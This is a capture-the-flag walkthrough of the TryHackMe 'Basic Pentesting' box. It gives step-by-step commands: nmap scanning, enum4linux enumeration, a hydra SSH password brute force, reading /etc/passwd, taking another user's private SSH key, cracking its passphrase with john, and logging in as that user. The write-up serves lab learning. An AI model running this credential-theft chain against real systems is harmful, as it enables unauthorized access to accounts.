
# Basic Pentesting TryHackMe Box

First run Nmap scan and store the contents in the file *nmap.txt*
```bash
nmap -sS -p- -T4 10.10.152.174 -oN nmap.txt
```

Use **dirbuster** to find hidden directories

>  found ***/development***


Enumerate through the server to find user details and store in *enum.txt*
```bash
sudo enum4linux -a 10.10.152.174 > enum.txt
```

Find **jan**'s password through brute force and store details to *hydra.txt*
```bash
 hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.152.174 > hydra.txt
```

> Found password ***armando***


Connect to the server through ssh using jan's credentials
```bash
ssh jan@10.10.152.174
```

Find users within the system
```bash
 cat /etc/passwd 
```

Navigate to **kay**'s home directory and find the ***.ssh*** directory
```bash
cd .ssh
```

Read and copy the private key
```bash
cat id_rsa
```

Save the private key

> I've used *id_rsa_kay*


Use **ssh2john** to crack the hash and output it to *openhash.txt*
```bash
sudo ./ssh2john.py ~/Pentest/JHBasicPentest/id_rsa_kay > ~/Pentest/JHBasicPentest/openhash.txt
```

Run **john** with the **rockyou wordlist** to generate the passphrase for the private key and output to *kaypass.txt*:
```bash
john openhash.txt --wordlist=/usr/share/wordlists/rockyou.txt > kaypass.txt
```

Change permissions for the private key to allow for acceptance by ssh
```bash
chmod 0400 id_rsa_kay
```

Open ssh client with *kay*'s credentials
```bash
ssh -i id_rsa_kay kay@10.10.152.174
```

Open the *pass.bak* file to find the final password
```bash
cat pass.bak
```
